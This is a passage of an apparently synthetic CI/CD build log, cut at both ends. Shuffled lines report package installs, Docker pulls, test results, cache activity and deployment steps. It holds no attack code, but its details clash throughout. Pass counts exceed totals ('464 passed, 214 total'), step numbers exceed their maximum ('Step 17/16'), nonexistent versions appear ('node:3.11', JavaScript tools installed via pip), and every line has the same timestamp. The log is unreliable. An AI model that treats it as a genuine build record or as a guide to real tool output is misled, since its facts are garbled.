packages\nOptimizing 75 modules...\nEnvironment: staging\n[12:18:17] INFO: Connecting to database\nConnection established\nProcessing...\nVerifying...\nCreating production build...\nHEAD is now at 77109c6\nInstalling axios@1.15.0\nRan 59 tests in 34s\npip: Installing build dependencies...\nWARNING: react has known vulnerabilities\nEnvironment: production\nFetching submodules...\nWARNING: lodash has known vulnerabilities\nAlready up to date.\nLayer 7/10: RUN command\nAlready up to date.\n[12:18:17] WARN: Deprecated API usage\npip install: Successfully installed jest-3.11\nConnecting to example.com:443...\n[12:18:17] INFO: Starting build process\nGET /status - 204 (24ms)\nAlready up to date.\nCache restored successfully (335MB)\n[12:18:17] WARN: Deprecated API usage\nCache restored successfully (199MB)\nFinished.\nLoading...\nOptimizing 50 modules...\nCache invalidated: build\nStep 13/23: Deploying\nHEAD is now at f864be2\nVerifying...\nnpm install: added 120 packages\nRan 191 tests in 41s\n[12:18:17] DEBUG: Memory usage: 795MB\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:17] DEBUG: Connection pool: 12 active\nPulling image: alpine:latest\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWaiting...\nSnapshots: 18 passed, 7 total\nCompiling lib/index.js...\nOptimizing 91 modules...\nUploading artifact 'coverage' (42 files)\n[12:18:17] INFO: Cache refreshed\nInstalling prettier@1.0.0\nGenerating source maps...\nUsing Node.js 19.18.10\nDone.\nCompiling lib/service.java...\n[12:18:17] DEBUG: Loading configuration\nPlatform: win32-x64\nNODE_ENV=development\nPlatform: linux-x64\nSuccess!\nGenerating source maps...\n\u2713 test completed\nPlatform: darwin-arm64\n\u2713 Task completed in 1007ms\nCache miss for key-7617\n\u2713 Step 'setup' succeeded\nDone.\n[12:18:17] DEBUG: Initializing service\n[12:18:17] INFO: Connecting to database\nTest Suites: 36 passed, 39 total\n[12:18:17] WARN: Deprecated API usage\nPlatform: linux-x64\nTest Suites: 34 passed, 24 total\nCache miss for key-7675\n[12:18:17] INFO: Starting build process\nTLS handshake completed\nCache miss for key-8064\nFAILED: test_user_create\n[12:18:17] DEBUG: Memory usage: 818MB\n\u2713 package completed\nArtifact uploaded: build.tar.gz (21MB)\nVerifying...\nCompiling components/utils.go...\nTime: 55.79s\nCache hit for key-4734\nyarn add: Done in 20.27s\nArtifact downloaded: 50MB\nWARNING: express has known vulnerabilities\nFAILED: test_api_health\n[12:18:17] INFO: Processing request\n\u2713 Step 'setup' succeeded\nSuccess!\n  PASS: test_auth_login (136ms)\nException: NullPointerException\npip install: Successfully installed eslint-1.0\nStep 17/16: Deploying\nTests: 464 passed, 214 total\nWARNING: express has known vulnerabilities\nImage pulled successfully\nConnection established\n\u2713 Task completed in 3044ms\n  PASS: e2e/test_user_create.spec.js\npip: Downloading lodash-4.5.tar.gz\nStep 7/25: Running migrations\n[12:18:17] INFO: Request completed\nPOST /data - 200 (449ms)\nPushing to registry...\npip: Collecting express\nStep 6/15: Building\nFetching submodules...\nEnvironment: production\n\u2713 Step 'build' succeeded\nReady.\nCache miss for key-4154\nEnvironment: test\n[12:18:17] INFO: Starting build process\n[12:18:17] INFO: Starting build process\nPulling image: node:18\nBuilding Docker image...\nnpm install: resolved 866 packages\nArtifact uploaded: dist.zip (49MB)\nGET /health - 201 (87ms)\nNODE_ENV=development\nUsing Python 3.9\nStep 9/22: Installing dependencies\nTests: 218 passed, 363 total\nTests: 57 passed, 402 total\n[12:18:17] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCoverage: 75% statements, 76% branches\n[12:18:17] WARN: Deprecated API usage\nCompleted.\nWARNING: eslint has known vulnerabilities\nImage pulled successfully\n[12:18:17] INFO: Connecting to database\npip: Installing build dependencies...\nCompiling lib/utils.go...\nFinished.\nCache saved successfully\nyarn add: Done in 28.16s\nyarn add: Done in 1.13s\nStep 4/25: Testing\n[12:18:17] INFO: Request completed\nFAILED: test_user_create\npip: Installing build dependencies...\nSuccess!\nMinifying main.js\n\u2713 Step 'install' succeeded\n[12:18:17] ERROR: Connection failed\nUploading artifact 'coverage' (7 files)\nCompiling lib/utils.go...\nFetching submodules...\nArtifact uploaded: dist.zip (37MB)\nUsing Python 3.10\npip install: Successfully installed eslint-4.10\nUsing Node.js 20.14.3\n[12:18:17] ERROR: Connection failed\nOK\n  PASS: test_auth_login (349ms)\nCompiling utils/handler.rs...\nFetching submodules...\n[12:18:17] DEBUG: Loading configuration\n=== Step setup_environment completed ===\n=== Step: build ===\nPlatform: darwin-arm64\n[12:18:17] DEBUG: Memory usage: 875MB\nReady.\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-8540\nHEAD is now at a4776fc\nAlready up to date.\nCoverage: 90% statements, 74% branches\npip: Installing build dependencies...\nCompleted.\nDone.\nCompiling src/utils.go...\n  PASS: integration/test_user_create.spec.js\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: lodash has known vulnerabilities\nVerifying...\nTest Suites: 20 passed, 48 total\nCompiling src/app.ts...\nStep 7/15: Testing\nnpm notice: package.json updated\nReady.\nCache saved successfully\n\u2713 All checks passed\nPushing to registry...\nSuccess!\nBuilding Docker image...\nBuilding Docker image...\n[12:18:17] ERROR: Connection failed\nPulling image: node:3.11\nCompiling utils/app.ts...\nConnecting to acme.corp:443...\nMinifying vendor.js\nArtifact uploaded: dist.zip (72MB)\n  PASS: test_api_health (447ms)\nStep 10/22: Linting\nPulling image: node:latest\nStep 20/23: Installing dependencies\nStep 20/22: Linting\nDone.\nCache hit for key-3590\nOptimizing 55 modules...\nConnection established\nPlatform: darwin-arm64\nStep 5/16: Installing dependencies\nInstalling prettier@1.11.0\n  PASS: test_auth_login (459ms)\nArtifact downloaded: 36MB\nException: RuntimeError\n\u2713 Step 'install' succeeded\npip: Installing build dependencies...\nBuilding Docker image...\nTime: 86.876s\nCompiling lib/utils.go...\nFAILED: test_auth_login\nSuccess!\nFetching submodules...\nPlatform: win32-x64\nStep 1/18: Linting\n[12:18:17] DEBUG: Initializing service\npip: Installing build dependencies...\nnpm install: added 496 packages\nPulling image: node:3.11\nBuilding Docker image...\nCache miss for key-9646\nFAILED: test_db_connect\nStep 3/23: Linting\nWARNING: axios has known vulnerabilities\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (9MB)\nSnapshots: 36 passed, 23 total\nPulling image: python:3.11\n[12:18:17] DEBUG: Loading configuration\nCompiling src/main.py...\nSuccess!\nChecking out master branch\nHEAD is now at 7eeb0dd\nArtifact uploaded: dist.zip (67MB)\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: RuntimeError\nUploading artifact 'coverage' (48 files)\nCompiling components/index.js...\nReady.\nnpm install: resolved 555 packages\nHEAD is now at 02540a1\nOK\npip install: Successfully installed express-1.6\nCache invalidated: node_modules\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (22MB)\nLayer 4/15: RUN command\nLayer 7/15: ENV command\nPulling image: node:latest\nCreating production build...\nFinished.\n\u2717 build failed with exit code 95\n[12:18:17] DEBUG: Memory usage: 1185MB\n\u2713 package completed\nCache miss for key-1030\nException: NullPointerException\nWARNING: webpack has known vulnerabilities\n[12:18:17] INFO: Request completed\n  PASS: test_db_connect (111ms)\nStep 18/24: Installing dependencies\nFAILED: test_user_create\npip: Downloading webpack-2.6.tar.gz\nStep 6/24: Installing dependencies\nOptimizing 54 modules...\n[12:18:17] INFO: Cache refreshed\nArtifact downloaded: 29MB\nFetching submodules...\nArtifact downloaded: 13MB\nStep 4/19: Installing dependencies\n  PASS: integration/test_api_health.spec.js\nCache hit for key-7970\nChecking out master branch\nTests: 481 passed, 406 total\npip: Installing build dependencies...\n[12:18:17] WARN: Deprecated API usage\npip: Collecting express\nUploading artifact 'dist' (20 files)\nImage pulled successfully\nTime: 119.902s\npip: Downloading webpack-2.20.tar.gz\n[12:18:17] DEBUG: Connection pool: 4 active\nArtifact downloaded: 23MB\nChecking out master branch\nRan 200 tests in 15s\nTLS handshake completed\nHEAD is now at 7656ee1\nReady.\nUploading artifact 'build' (18 files)\nnpm notice: created a lockfile\nOK\npip install: Successfully installed react-5.12\nCache invalidated: dependencies\n  PASS: unit/test_api_health.spec.js\nConnecting to test.io:443...\nStep 9/20: Linting\nCreating production build...\nBuilding Docker image...\nnpm install: added 244 packages\npip: Downloading eslint-1.14.tar.gz\nCache invalidated: dependencies\nVerifying...\nStep 18/20: Testing\nCreating production build...\nCache invalidated: node_modules\n\u2713 Step 'test' succeeded\nHEAD is now at 6f1cb1b\nUsing Node.js 17.2.9\nPushing to registry...\nCache invalidated: dependencies\nStep 2/16: Linting\nEnvironment: staging\nReady.\nCompiling src/service.java...\nSwitched to branch 'feature/task-374'\nCompleted.\nLayer 5/14: RUN command\nSuccess!\n\u2713 All checks passed\nConnecting to acme.corp:443...\nCompiling src/utils.go...\n[12:18:17] INFO: Cache refreshed\n[12:18:17] DEBUG: Loading configuration\nFinished.\nImage pulled successfully\nStep 12/16: Deploying\nBundling runtime.css\npip install: Successfully installed eslint-1.18\nTest Suites: 9 passed, 45 total\nCache miss for key-3414\nnpm notice: created a lockfile\nyarn add: Done in 11.12s\nnpm notice: created a lockfile\nChecking out main branch\nCache miss for key-9373\nConnection established\n[12:18:17] WARN: Deprecated API usage\nCompleted.\nCache restored successfully (226MB)\nCache invalidated: dependencies\nTLS handshake completed\nFetching submodules...\nPulling image: alpine:latest\nGET /api - 201 (96ms)\npip: Collecting react\nPulling image: alpine:latest\nCache saved successfully\nnpm install: resolved 376 packages\nnpm install: added 465 packages\n[12:18:17] INFO: Request completed\n[12:18:17] INFO: Connecting to database\nTransforming 235 files...\n[12:18:17] INFO: Connecting to database\nProcessing...\nRan 67 tests in 38s\nReady.\n=== Step build completed ===\n=== Step: integration_tests ===\n[12:18:17] INFO: Starting build process\nOK\nStep 15/21: Installing dependencies\nOptimizing 54 modules...\nTLS handshake completed\n[12:18:17] DEBUG: Connection pool: 7 active\n[12:18:17] DEBUG: Connection pool: 2 active\nCompiling utils/utils.go...\nCompiling components/utils.go...\nRan 195 tests in 32s\nStep 12/21: Testing\nOptimizing 94 modules...\n  PASS: unit/test_auth_login.spec.js\nMinifying vendor.js\nImage pulled successfully\n[12:18:17] INFO: Cache refreshed\nChecking out master branch\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Downloading eslint-5.18.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nHEAD is now at a1b730f\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 827 files...\n[12:18:17] ERROR: Connection failed\nTLS handshake completed\nnpm install: added 112 packages\nVerifying...\n[12:18:17] INFO: Request completed\nStep 11/20: Installing dependencies\n[12:18:17] DEBUG: Query executed in 46ms\n\u2713 Step 'checkout' succeeded\n[12:18:17] INFO: Request completed\nNODE_ENV=test\n[12:18:17] WARN: Deprecated API usage\nUsing Node.js 18.18.5\nBuilding Docker image...\nTest Suites: 43 passed, 45 total\nConnecting to acme.corp:443...\nStep 7/23: Building\n[12:18:17] DEBUG: Loading configuration\nCache restored successfully (439MB)\nFetching submodules...\nStep 4/18: Linting\nnpm notice: package.json updated\nCompiling components/utils.go...\nCompiling lib/index.js...\nCache miss for key-4975\n  PASS: e2e/test_user_create.spec.js\nInstalling express@2.9.1\nTLS handshake completed\nSuccess!\nTransforming 610 files...\npip: Installing build dependencies...\nTest Suites: 43 passed, 45 total\nSwitched to branch 'feature/task-950'\nCompiling lib/service.java...\nStep 2/23: Deploying\nnpm install: added 375 packages\nChecking out master branch\nStep 10/17: Running migrations\n\u2713 Task completed in 3184ms\nWaiting...\nPlatform: win32-x64\nAlready up to date.\n[12:18:17] DEBUG: Query executed in 79ms\nCache invalidated: dependencies\nReady.\nCompiling lib/utils.go...\n[12:18:17] WARN: Deprecated API usage\nException: NullPointerException\nSwitched to branch 'bugfix/task-362'\n[12:18:17] INFO: Connecting to database\nStep 1/23: Linting\nBundling runtime.js\n  PASS: test_cache_hit (183ms)\nSuccess!\n  PASS: integration/test_user_create.spec.js\nyarn add: Done in 18.77s\n  PASS: test_user_create (273ms)\nStep 9/21: Running migrations\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] DEBUG: Connection pool: 8 active\nCache saved successfully\nGenerating source maps...\nnpm install: resolved 1765 packages\nAlready up to date.\nOK\nArtifact downloaded: 18MB\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\nStep 15/17: Testing\nConnection established\nPushing to registry...\nCache saved successfully\n\u2713 Step 'test' succeeded\nSnapshots: 46 passed, 42 total\n\u2713 lint completed\nStep 14/15: Running migrations\nCache miss for key-4904\n\u2717 build failed with exit code 50\nUsing Python 3.9\nCoverage: 87% statements, 83% branches\nCoverage: 90% statements, 73% branches\nOptimizing 18 modules...\n  PASS: test_user_create (115ms)\nTransforming 794 files...\nArtifact downloaded: 37MB\nCompiling lib/index.js...\n[12:18:17] DEBUG: Loading configuration\n[12:18:17] DEBUG: Initializing service\nFinished.\nCache restored successfully (135MB)\n\u2717 build failed with exit code 12\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'install' succeeded\nCache saved successfully\n[12:18:17] INFO: Cache refreshed\nStep 9/25: Running migrations\nOptimizing 84 modules...\nBundling vendor.js\nUsing Python 3.12\n[12:18:17] DEBUG: Query executed in 55ms\nnpm notice: created a lockfile\n[12:18:17] INFO: Connecting to database\nCache saved successfully\nFinished.\nBuilding Docker image...\nEnvironment: development\nnpm notice: package.json updated\nTests: 283 passed, 388 total\nCache invalidated: build\nFAILED: test_user_create\nWaiting...\nAlready up to date.\nVerifying...\nPulling image: node:latest\nPlatform: darwin-arm64\nTime: 33.291s\nGenerating source maps...\n\u2713 Step 'build' succeeded\nStep 20/17: Running migrations\nStep 13/15: Linting\nConnection established\nBundling styles.js\nUsing Python 3.11\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 4/17: Testing\nStep 17/24: Running migrations\n[12:18:17] WARN: Deprecated API usage\nWARNING: lodash has known vulnerabilities\nMinifying vendor.js\npip install: Successfully installed axios-4.19\nStep 8/21: Installing dependencies\nCache saved successfully\nnpm install: resolved 376 packages\nCoverage: 86% statements, 89% branches\nPulling image: node:18\nImage pulled successfully\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFAILED: test_user_create\nArtifact downloaded: 20MB\nnpm install: added 399 packages\nTransforming 346 files...\nConnecting to cloud.services:443...\nLayer 5/9: ENV command\nCompiling lib/app.ts...\nWaiting...\nOK\nCompiling lib/app.ts...\nPushing to registry...\nTransforming 861 files...\nOK\nCompiling lib/handler.rs...\n[12:18:17] DEBUG: Loading configuration\nDone.\nnpm notice: created a lockfile\nCache restored successfully (145MB)\nDone.\nStep 20/24: Building\nnpm notice: package.json updated\n\u2713 lint completed\nUsing Node.js 15.4.6\nCache saved successfully\nConnecting to cloud.services:443...\nInstalling express@3.16.4\npip install: Successfully installed jest-1.11\nCompiling components/app.ts...\nCompiling src/index.js...\nWARNING: react has known vulnerabilities\nSwitched to branch 'hotfix/task-825'\nUploading artifact 'build' (34 files)\n[12:18:17] WARN: Deprecated API usage\nyarn add: Done in 12.87s\nCompleted.\nTests: 214 passed, 194 total\n[12:18:17] INFO: Connecting to database\n[12:18:17] DEBUG: Loading configuration\n=== Step integration_tests completed ===\n=== Step: install_dependencies ===\nCoverage: 78% statements, 64% branches\nCache saved successfully\nVerifying...\nHEAD is now at f1457de\n\u2713 Step 'checkout' succeeded\nPushing to registry...\nUploading artifact 'coverage' (13 files)\nTransforming 315 files...\nCompiling lib/index.js...\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 4/17: Running migrations\nProcessing...\nTime: 107.213s\npip: Collecting express\nBundling main.css\nWARNING: eslint has known vulnerabilities\nCompiling components/index.js...\npip install: Successfully installed express-3.16\n[12:18:17] DEBUG: Query executed in 82ms\n[12:18:17] DEBUG: Connection pool: 18 active\n[12:18:17] WARN: Deprecated API usage\nUsing Python 3.11\nReady.\nWARNING: express has known vulnerabilities\n[12:18:17] DEBUG: Initializing service\n[12:18:17] INFO: Connecting to database\nArtifact downloaded: 4MB\nCompiling lib/utils.go...\nConnecting to cloud.services:443...\nTransforming 169 files...\nyarn add: Done in 10.94s\nArtifact uploaded: build.tar.gz (23MB)\nLayer 8/13: RUN command\nRan 10 tests in 55s\nTLS handshake completed\nGET /api - 200 (6ms)\nOptimizing 85 modules...\nLoading...\nCreating production build...\nConnecting to test.io:443...\nDone.\nWARNING: prettier has known vulnerabilities\n  PASS: e2e/test_cache_hit.spec.js\nCache miss for key-6188\nPulling image: python:latest\nMinifying vendor.js\n[12:18:17] ERROR: Connection failed\nHEAD is now at 3e243da\nTLS handshake completed\nConnecting to startup.dev:443...\nSnapshots: 12 passed, 47 total\nMinifying vendor.js\nHEAD is now at fcb5256\nStep 10/15: Running migrations\nOptimizing 34 modules...\nReady.\n[12:18:17] DEBUG: Initializing service\nSuccess!\nArtifact uploaded: build.tar.gz (41MB)\nTest Suites: 24 passed, 30 total\nStep 17/19: Deploying\n[12:18:17] INFO: Processing request\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] ERROR: Connection failed\nFinished.\nProcessing...\nCompleted.\n[12:18:17] WARN: Deprecated API usage\nPOST /upload - 201 (244ms)\nLoading...\nImage pulled successfully\n\u2713 build completed\n[12:18:17] DEBUG: Loading configuration\nCompiling lib/app.ts...\nVerifying...\nPlatform: darwin-arm64\n[12:18:17] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\n\u2713 Task completed in 3767ms\npip: Collecting express\nWARNING: jest has known vulnerabilities\nStep 8/24: Running migrations\nCache hit for key-7606\nTests: 278 passed, 102 total\nCache miss for key-3084\nException: RuntimeError\nConnecting to startup.dev:443...\n\u2713 Step 'test' succeeded\nCache saved successfully\nConnecting to test.io:443...\npip install: Successfully installed axios-4.2\nCompleted.\n\u2713 Task completed in 4218ms\n[12:18:17] DEBUG: Memory usage: 1150MB\nnpm notice: created a lockfile\nFinished.\nTLS handshake completed\nStep 11/25: Linting\nCompleted.\nCompiling components/service.java...\nCreating production build...\nImage pulled successfully\nCompleted.\n[12:18:17] DEBUG: Loading configuration\nEnvironment: production\nStep 12/21: Testing\nCache restored successfully (386MB)\nCompiling utils/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 43 passed, 20 total\nRan 73 tests in 31s\n[12:18:17] DEBUG: Connection pool: 1 active\nCache miss for key-6377\nGenerating source maps...\nCache miss for key-6055\n\u2713 Step 'build' succeeded\nCache invalidated: node_modules\n[12:18:17] DEBUG: Connection pool: 20 active\n\u2713 Step 'setup' succeeded\nHEAD is now at 2cca6d0\nnpm install: resolved 159 packages\n[12:18:17] INFO: Request completed\nSuccess!\nAlready up to date.\nWaiting...\nDone.\nTest Suites: 26 passed, 33 total\nCoverage: 85% statements, 92% branches\n  PASS: test_db_connect (351ms)\nWaiting...\n[12:18:17] WARN: Deprecated API usage\nStep 7/21: Deploying\n[12:18:17] INFO: Request completed\n[12:18:17] INFO: Cache refreshed\nImage pulled successfully\n[12:18:17] DEBUG: Query executed in 86ms\nCreating production build...\nCache invalidated: node_modules\nTests: 183 passed, 83 total\n[12:18:17] DEBUG: Memory usage: 932MB\nCompiling utils/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Node.js 18.10.10\n\u2713 Step 'setup' succeeded\nStep 19/25: Building\n\u2713 All checks passed\nSwitched to branch 'feature/task-200'\nCache hit for key-6347\nArtifact downloaded: 14MB\nTime: 83.614s\n[12:18:17] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-709'\nOK\nUsing Python 3.12\nSwitched to branch 'feature/task-996'\nPulling image: alpine:18\nTransforming 406 files...\n[12:18:17] WARN: Deprecated API usage\nStep 13/24: Installing dependencies\n  PASS: test_user_create (406ms)\nCreating production build...\n\u2713 All checks passed\nArtifact uploaded: dist.zip (60MB)\nSnapshots: 8 passed, 30 total\nGenerating source maps...\nHEAD is now at 175c8d0\nFAILED: test_auth_login\nTransforming 654 files...\nConnecting to cloud.services:443...\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] INFO: Starting build process\nVerifying...\nCache miss for key-8778\nWARNING: eslint has known vulnerabilities\nCache restored successfully (479MB)\nnpm install: added 480 packages\nUsing Python 3.12\nBuilding Docker image...\nFinished.\nStep 5/15: Testing\nBuilding Docker image...\nCache miss for key-9947\nFetching submodules...\nReady.\npip: Downloading prettier-2.17.tar.gz\nCache miss for key-2345\n[12:18:17] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_auth_login (235ms)\nPushing to registry...\npip: Installing build dependencies...\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] DEBUG: Initializing service\nCompiling utils/utils.go...\n  PASS: test_user_create (92ms)\nUploading artifact 'coverage' (15 files)\nMinifying app.js\nWaiting...\nCache saved successfully\n=== Step install_dependencies completed ===\n=== Step: deploy_production ===\npip: Installing build dependencies...\nWaiting...\nWARNING: prettier has known vulnerabilities\nBuilding Docker image...\nCompiling components/handler.rs...\nInstalling prettier@3.13.0\nTest Suites: 27 passed, 41 total\n[12:18:17] DEBUG: Initializing service\n[12:18:17] DEBUG: Initializing service\n  PASS: test_db_connect (314ms)\n[12:18:17] WARN: Deprecated API usage\nDone.\nStep 11/22: Running migrations\nWARNING: react has known vulnerabilities\n[12:18:17] WARN: Deprecated API usage\nCompleted.\nyarn add: Done in 12.58s\nSwitched to branch 'feature/task-216'\n[12:18:17] ERROR: Connection failed\nBuilding Docker image...\nCompiling lib/service.java...\nTLS handshake completed\n[12:18:17] DEBUG: Connection pool: 12 active\nTransforming 936 files...\nGET /api - 201 (98ms)\nGET /health - 201 (17ms)\n\u2713 validate completed\nCompiling src/service.java...\nSwitched to branch 'feature/task-391'\nRan 131 tests in 49s\npip install: Successfully installed jest-4.6\n  PASS: e2e/test_auth_login.spec.js\n[12:18:17] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (20MB)\nnpm notice: created a lockfile\nnpm install: added 205 packages\nConnecting to example.com:443...\nCoverage: 99% statements, 80% branches\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2717 build failed with exit code 45\nMinifying vendor.js\nWARNING: jest has known vulnerabilities\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (10MB)\nConnecting to test.io:443...\nWARNING: jest has known vulnerabilities\nWARNING: react has known vulnerabilities\nCache miss for key-7687\nCache hit for key-4758\nAlready up to date.\nBuilding Docker image...\nCache restored successfully (126MB)\nCache miss for key-8242\nTransforming 463 files...\nPlatform: win32-x64\nCache saved successfully\nGET /api - 200 (52ms)\nnpm install: resolved 1366 packages\nFinished.\npip: Collecting webpack\nDone.\nCompiling lib/main.py...\nGenerating source maps...\nTime: 118.674s\nCoverage: 74% statements, 95% branches\n  PASS: e2e/test_auth_login.spec.js\n[12:18:17] DEBUG: Connection pool: 11 active\n[12:18:17] INFO: Processing request\nCreating production build...\n[12:18:17] WARN: Deprecated API usage\nMinifying app.js\nnpm notice: created a lockfile\nLoading...\nBuilding Docker image...\nStep 8/22: Deploying\nCompiling utils/main.py...\nCache invalidated: node_modules\nCompleted.\nNODE_ENV=test\nCache restored successfully (94MB)\nFAILED: test_auth_login\nDone.\nGenerating source maps...\nSwitched to branch 'hotfix/task-706'\nArtifact uploaded: dist.zip (36MB)\nStep 13/22: Installing dependencies\n\u2713 deploy completed\nFetching submodules...\nFAILED: test_db_connect\n[12:18:17] DEBUG: Loading configuration\npip: Downloading prettier-4.5.tar.gz\nBuilding Docker image...\nUsing Node.js 18.1.9\nCompiling utils/app.ts...\nCache saved successfully\n\u2713 All checks passed\nSwitched to branch 'hotfix/task-910'\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 1/19: Installing dependencies\nSnapshots: 38 passed, 38 total\nnpm notice: package.json updated\nVerifying...\nCompiling components/main.py...\nImage pulled successfully\nWARNING: prettier has known vulnerabilities\n\u2713 All checks passed\nStep 14/19: Testing\nBundling main.css\n\u2717 build failed with exit code 127\n  PASS: unit/test_cache_hit.spec.js\nFetching submodules...\nMinifying main.js\nHEAD is now at efee0eb\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] ERROR: Connection failed\nTransforming 485 files...\nSuccess!\nUsing Python 3.10\n[12:18:17] INFO: Starting build process\nCoverage: 83% statements, 66% branches\nRan 121 tests in 5s\nProcessing...\n[12:18:17] INFO: Processing request\npip: Downloading webpack-3.0.tar.gz\nStep 7/25: Running migrations\nStep 14/20: Building\nStep 2/21: Running migrations\nPulling image: alpine:3.11\nOptimizing 83 modules...\nnpm install: resolved 488 packages\nCompleted.\nyarn add: Done in 13.21s\nStep 7/20: Deploying\n[12:18:17] INFO: Starting build process\n[12:18:17] WARN: Deprecated API usage\nUploading artifact 'coverage' (26 files)\nStep 18/23: Building\nHEAD is now at e66edea\nDone.\nStep 10/18: Building\nSnapshots: 44 passed, 41 total\nTest Suites: 31 passed, 26 total\nMinifying app.js\nPOST /api - 200 (371ms)\nStep 3/18: Deploying\nPlatform: linux-x64\n[12:18:17] INFO: Request completed\nFetching submodules...\n[12:18:17] DEBUG: Query executed in 39ms\nWaiting...\nCompiling src/service.java...\n[12:18:17] INFO: Connecting to database\nOptimizing 30 modules...\nyarn add: Done in 5.53s\nAlready up to date.\nVerifying...\nRan 69 tests in 8s\nnpm install: resolved 1735 packages\nChecking out master branch\n[12:18:17] ERROR: Connection failed\nCache restored successfully (90MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\nImage pulled successfully\nFinished.\npip: Collecting webpack\nStep 18/25: Running migrations\npip: Installing build dependencies...\n\u2713 build completed\nyarn add: Done in 25.92s\nStep 9/25: Building\nTransforming 729 files...\npip: Installing build dependencies...\nArtifact downloaded: 8MB\nEnvironment: production\nStep 9/21: Deploying\n[12:18:17] INFO: Request completed\nDone.\nRan 160 tests in 5s\nStep 8/18: Installing dependencies\nMinifying main.js\nnpm notice: created a lockfile\nPushing to registry...\nPlatform: win32-x64\n[12:18:17] DEBUG: Initializing service\nNODE_ENV=production\n[12:18:17] INFO: Request completed\n\u2713 lint completed\nGenerating source maps...\nFAILED: test_auth_login\nUsing Python 3.11\nPlatform: darwin-arm64\n[12:18:17] WARN: Deprecated API usage\nnpm notice: created a lockfile\nCompleted.\nReady.\nUploading artifact 'coverage' (30 files)\nUsing Python 3.10\nProcessing...\n[12:18:17] WARN: Deprecated API usage\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\nVerifying...\nRan 21 tests in 25s\nSuccess!\nCompiling utils/service.java...\nnpm install: resolved 552 packages\nUploading artifact 'coverage' (9 files)\nCompiling src/handler.rs...\nTest Suites: 36 passed, 40 total\nMinifying main.js\nCache saved successfully\n[12:18:17] INFO: Starting build process\nCache miss for key-6074\n  PASS: unit/test_api_health.spec.js\nArtifact uploaded: build.tar.gz (43MB)\n\u2713 deploy completed\nBuilding Docker image...\n[12:18:17] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: eslint has known vulnerabilities\nLayer 8/8: COPY command\nArtifact uploaded: dist.zip (21MB)\nEnvironment: production\nnpm notice: package.json updated\nNODE_ENV=development\n[12:18:17] DEBUG: Memory usage: 884MB\nnpm notice: created a lockfile\nStep 6/16: Running migrations\nOK\nLayer 6/9: ENV command\n[12:18:17] DEBUG: Query executed in 90ms\nCache miss for key-1226\nCoverage: 97% statements, 88% branches\n\u2713 Task completed in 249ms\nMinifying app.js\nCompiling utils/service.java...\nWARNING: express has known vulnerabilities\nnpm install: added 55 packages\nyarn add: Done in 18.30s\nArtifact uploaded: dist.zip (54MB)\nTLS handshake completed\nStep 4/16: Building\nMinifying main.js\n[12:18:17] INFO: Processing request\nOptimizing 13 modules...\nTransforming 265 files...\n[12:18:17] DEBUG: Query executed in 12ms\n  PASS: e2e/test_cache_hit.spec.js\nTests: 194 passed, 151 total\nChecking out main branch\nWARNING: prettier has known vulnerabilities\nTLS handshake completed\npip install: Successfully installed webpack-3.3\nCreating production build...\nReady.\nFinished.\npip: Downloading express-4.0.tar.gz\nStep 5/25: Building\nTransforming 986 files...\n\u2717 build failed with exit code 83\nCache miss for key-4941\nVerifying...\nStep 14/21: Building\nPushing to registry...\n  PASS: test_user_create (9ms)\nLayer 10/13: ENV command\n[12:18:17] INFO: Cache refreshed\nCompleted.\n[12:18:17] WARN: Deprecated API usage\nStep 13/21: Testing\nHEAD is now at 35587e8\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nyarn add: Done in 10.4s\nImage pulled successfully\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPulling image: python:latest\nStep 9/19: Installing dependencies\nGenerating source maps...\nBuilding Docker image...\n[12:18:17] ERROR: Connection failed\nStep 2/21: Testing\nEnvironment: development\nnpm notice: created a lockfile\nStep 6/15: Deploying\nStep 3/23: Running migrations\nPOST /data - 202 (234ms)\n\u2713 Task completed in 268ms\n[12:18:17] INFO: Starting build process\n[12:18:17] INFO: Cache refreshed\nConnecting to test.io:443...\nFinished.\nnpm install: resolved 692 packages\n\u2713 validate completed\n[12:18:17] INFO: Cache refreshed\n[12:18:17] WARN: Deprecated API usage\nStep 15/19: Testing\nSwitched to branch 'bugfix/task-328'\nPulling image: python:latest\nCompiling components/index.js...\nUploading artifact 'build' (30 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:17] INFO: Cache 